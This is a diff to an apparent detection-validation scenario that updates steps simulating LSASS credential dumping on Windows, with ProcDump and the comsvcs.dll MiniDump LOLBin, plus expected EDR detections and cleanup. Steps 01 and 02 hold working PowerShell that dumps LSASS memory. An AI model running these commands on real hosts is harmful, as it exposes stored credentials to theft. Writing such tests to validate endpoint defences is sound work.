@@ -91,14 +91,35 @@ external_tools:
 steps:
   - id: step-01
     name: "Open a handle to LSASS with sensitive access rights (ProcDump variant)"
-    command: "Invoke-AtomicTest T1003.001 -TestNumbers 1 -GetPrereqs; Invoke-AtomicTest T1003.001 -TestNumbers 1"
+    # ProcDump, run directly (atomic T1003.001 test 1's own command line). It
+    # must already be on the target — PATH, or Atomic Red Team's
+    # ExternalPayloads folder. There is no -GetPrereqs any more: that fetched
+    # ProcDump from the internet at dispatch, which default-deny egress blocks,
+    # and a step whose tool never arrived is not a detection miss — so a
+    # missing ProcDump fails the step loudly instead. The dump is written,
+    # measured and deleted inside this step.
+    command: |
+      $pd = @(Get-Command procdump64.exe, procdump.exe -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Source) + @('C:\AtomicRedTeam\ExternalPayloads\procdump.exe') | Where-Object { $_ -and (Test-Path -LiteralPath $_) } | Select-Object -First 1
+      if (-not $pd) { Write-Error 'ProcDump not found on PATH or at C:\AtomicRedTeam\ExternalPayloads\procdump.exe: step-01 did not run, which is not a detection miss'; exit 1 }
+      # comsvcs/ProcDump argument parsing breaks on a path with spaces, so a
+      # spaced %TEMP% falls back to the system Temp directory.
+      $dir = if ($env:TEMP -match '\s') { Join-Path $env:SystemRoot 'Temp' } else { $env:TEMP }
+      $dmp = Join-Path $dir 'lsass-cortexsim-procdump.dmp'
+      Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath $dmp
+      & $pd -accepteula -ma lsass.exe $dmp
+      if (-not (Test-Path -LiteralPath $dmp)) { Write-Error 'ProcDump wrote no dump: prevented by the endpoint agent, or the beacon is not elevated'; exit 1 }
+      $len = (Get-Item -LiteralPath $dmp).Length
+      Remove-Item -Force -LiteralPath $dmp
+      # ProcDump's exit code is a dump count, not a status.
+      $global:LASTEXITCODE = 0
+      Write-Output "cortexsim-edr006-procdump-lsass-dump-written bytes=$len (deleted in-step)"
     identity: administrator
     mitre_technique: "T1003.001"
     platforms: ["windows"]
     expected_detections:
       - plane: EDR
         type: BIOC
-        description: "Non-allowlisted process opens a handle to lsass.exe requesting PROCESS_VM_READ / PROCESS_QUERY_INFORMATION"
+        description: "ProcDump (-ma), a non-allowlisted process, opens lsass.exe with an access mask that includes PROCESS_VM_READ (0x10) or PROCESS_QUERY_INFORMATION (0x400)"
         ttp_ref: "TTP-2026-0002"
         detection_id: "bioc-lsass-handle-open-with-sensitive-access-rights"
       - plane: EDR
@@ -109,7 +130,22 @@ steps:
 
   - id: step-02
     name: "Dump LSASS via comsvcs.dll MiniDump LOLBin (lives-off-the-land)"
-    command: "Invoke-AtomicTest T1003.001 -TestNumbers 3"
+    # The step is named comsvcs MiniDump and its detections key on rundll32 +
+    # comsvcs.dll MiniDump, but it used to run atomic test 3 (Dumpert, direct
+    # syscalls) — which produces neither. It now calls comsvcs directly. The
+    # trailing comma is inside the string on purpose: PowerShell turns a bare
+    # `comsvcs.dll, MiniDump` into two arguments and drops the comma.
+    command: |
+      $dir = if ($env:TEMP -match '\s') { Join-Path $env:SystemRoot 'Temp' } else { $env:TEMP }
+      $dmp = Join-Path $dir 'lsass-cortexsim.dmp'
+      Remove-Item -Force -ErrorAction SilentlyContinue -LiteralPath $dmp
+      $lsass = (Get-Process -Name lsass).Id
+      & "$env:SystemRoot\System32\rundll32.exe" "$env:SystemRoot\System32\comsvcs.dll," MiniDump $lsass $dmp full
+      if (-not (Test-Path -LiteralPath $dmp)) { Write-Error 'comsvcs MiniDump wrote no dump: prevented by the endpoint agent, or the beacon is not elevated'; exit 1 }
+      $len = (Get-Item -LiteralPath $dmp).Length
+      Remove-Item -Force -LiteralPath $dmp
+      $global:LASTEXITCODE = 0
+      Write-Output "cortexsim-edr006-comsvcs-minidump-written bytes=$len (deleted in-step)"
     identity: administrator
     mitre_technique: "T1218.011"
     platforms: ["windows"]
@@ -138,7 +174,14 @@ steps:
 
   - id: step-03
     name: "Confirm stitched credential-theft correlation"
-    command: "Get-ChildItem \"$env:TEMP\\lsass-*.dmp\" -ErrorAction SilentlyContinue | Select-Object FullName, Length; Write-Host '[*] LSASS dump sequence complete — validating XSIAM correlation'"
+    # The dumps live where steps 01-02 wrote them (%TEMP%, or the system Temp
+    # directory when %TEMP% has a space) and are deleted in-step, so this
+    # confirms none is left on disk rather than listing one.
+    command: |
+      $left = @(Get-ChildItem -Force -ErrorAction SilentlyContinue -Path "$env:TEMP\lsass-cortexsim*.dmp", "$env:SystemRoot\Temp\lsass-cortexsim*.dmp")
+      if ($left.Count -gt 0) { $left | Select-Object FullName, Length; Write-Error 'an LSASS dump from steps 01-02 is still on disk'; exit 1 }
+      Write-Output 'cortexsim-edr006-no-lsass-dump-left-on-disk'
+      Write-Output '[*] LSASS dump sequence complete — validating XSIAM correlation'
     identity: administrator
     mitre_technique: "T1003.001"
     platforms: ["windows"]
@@ -156,8 +199,11 @@ steps:
 
 cleanup:
   commands:
-    - "Remove-Item \"$env:TEMP\\lsass-*.dmp\" -Force -ErrorAction SilentlyContinue"
-    - "Write-Host '[CortexSim] SIM-EDR-006 cleanup complete — dump artifacts removed'"
+    # Only the files this scenario or its atomic tests name — never an
+    # arbitrary lsass-*.dmp the customer may be keeping — and it reports what it
+    # actually found, not that something was removed.
+    - "$found = @(Get-ChildItem -Force -ErrorAction SilentlyContinue -Path \"$env:TEMP\\lsass-cortexsim*.dmp\", \"$env:SystemRoot\\Temp\\lsass-cortexsim*.dmp\", \"$env:TEMP\\lsass-comsvcs.dmp\", \"$env:SystemRoot\\Temp\\lsass_dump.dmp\", \"$env:SystemRoot\\Temp\\dumpert.dmp\"); foreach ($f in $found) { Remove-Item -Force -LiteralPath $f.FullName; Write-Output ('removed ' + $f.FullName + ' (' + $f.Length + ' bytes)') }; if ($found.Count -eq 0) { Write-Output 'no LSASS dump artifacts were on disk' }"
+    - "Write-Host '[CortexSim] SIM-EDR-006 cleanup complete'"
 
 author: "Henry Reed"
 created: "2026-06-08"
